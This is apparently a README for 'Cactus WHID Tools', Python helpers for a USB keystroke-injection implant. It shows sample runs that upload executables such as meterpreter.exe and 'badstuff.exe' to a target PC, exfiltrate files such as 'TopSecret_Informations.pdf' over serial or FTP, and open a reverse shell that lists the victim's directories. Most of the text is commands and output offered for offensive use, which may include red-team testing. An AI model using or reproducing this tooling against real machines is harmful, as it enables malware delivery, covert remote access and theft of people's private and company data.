# Cactus WHID Tools

This little helpers allow you to upload files to the target-machine or to download files from the target-machine over the serial exfiltration.


## Mouse-Jiggler

Runs an endless Mouse-Jiggler.

    [mark@parrot ~]$ python3 Cactus_WHID_MouseJiggler.py 
    Jiggeling...
    Jiggeling...


## File to payload

Generates a payload textfile which recreate the file on the target system.

    [mark@parrot ~]$ python3 Cactus_WHID_File2Payload.py meterpreter.exe "D:\mp.exe"

This will generate `meterpreter.exe.txt` which can be uploaded as payload to the Cactus WHID.

## Uploader

Uploads a file from your system to the target system without creating a payload.

    [mark@parrot ~]$ python3 Cactus_WHID_Uploader.py
    FILE TO UPLOAD> badstuff.exe
    PATH ON TARGET-PC> D:\ex.exe
    Sending chunk 1 / 5 ... DONE
    Sending chunk 2 / 5 ... DONE
    Sending chunk 3 / 5 ... DONE
    Sending chunk 4 / 5 ... DONE
    Sending chunk 5 / 5 ... DONE


## Downloader

Allows you to retrive data from the target machine via SerialExfil feature

    [mark@parrot ~]$ python3 Cactus_WHID_SerialExfil_Downloader.py "D:\CompanySecrets\TopSecret_Informations.pdf"
    Need to send 640 chunks - this will take 14 minutes!
    LET THE WHID CACTUS DO IT's JOB - DONT USE IT TILL THE ESTIMATED TIME HAS PASSED!!!
    Got 768568 bytes
    FILE TopSecret_Informations.pdf (575466 bytes) RECEIVED

... or FTP Upload

    [mark@parrot ~]$ python3 Cactus_WHID_FTP_Downloader.py C:\\Users\\PGD\\AppData\\Local\\Temp\\exfil\\exfil.zip
    Opening powershell ...
    Connecting to network ...
    Splitting file into chunks ...
    Setting up FTP connection ...
    Setting up to Download 3 chunks ...
    Downloading chunk # 1 ... DONE
    Downloading chunk # 2 ... DONE
    Downloading chunk # 3 ... DONE
    FILE exfil.zip (2.8 MB) RECEIVED IN 297 SEC.


## Shell

I also added a reverse-shell based on the serial exfiltration feature.

    [mark@parrot ~]$ python3 Cactus_WHID_Shell.py 
    SETTING UP COM PORT ...
    WHID Shell> D:
    DONE!                         

    ------------------------------

    WHID Shell> pwd
                                
    Path
    ----
    D:\

    DONE!

    ------------------------------

    WHID Shell> ls
    Got 3399 bytes

        Verzeichnis: D:\

    Mode                 LastWriteTime         Length Name
    ----                 -------------         ------ ----
    d-----        19.01.2023     09:32                000_BreachCompilation
    d-----        14.02.2023     15:27                000_FIBU
    d-----        20.04.2023     13:32                Arduino_Projects
    d-----        26.01.2022     08:09                Blog
    d-----        27.05.2022     10:22                DeepSpar USB Stabilizer
    d-----        25.01.2022     15:29                DFL
    d-----        29.04.2023     15:54                CompanySecrets
    d-----        25.01.2022     15:36                Fonts
    d-----        23.10.2016     08:52                plaso-1.5.1
    d-----        24.01.2023     07:51                ThermoVision_JoeC_V1.11.0.0_FullPackage
    -a----        20.02.2023     11:22          40548 20001120-173443-816.docx
    -a----        15.02.2023     21:13         336511 295876653_187523913709482_8468603697724220508_n.jpg
    -a----        15.02.2023     21:12         274246 295981351_1089613031908454_91818091589731884_n.jpg
    -a----        01.11.2022     10:58          51724 307882633_1132461914046656_1915130222055064968_n.jpg
    -a----        23.12.2022     00:13        1288490 320765644_1336244020464538_903238157134500386_n.jpg
    -a----        27.11.2022     16:40         846320 demo_and_benchmark_Intel_N2920.txt
    -a----        17.02.2022     14:08     1994995712 paladin_edge_64.iso
    -a----        10.02.2022     19:04      139920730 rockyou.txt
    -a----        03.07.2022     09:27        1577592 WordRepair.exe

    DONE!

    ------------------------------

    WHID Shell> cd CompanySecrets
    DONE!                         

    ------------------------------

    WHID Shell> ls                 

        Verzeichnis: D:\CompanySecrets


    Mode                 LastWriteTime         Length Name
    ----                 -------------         ------ ----
    -a----        27.04.2023     12:40         575466 TopSecret_Informations.pdf
    -a----        26.04.2023     20:03         220666 EmbarrassingPicture.jpg


    DONE!

    ------------------------------

    WHID Shell>

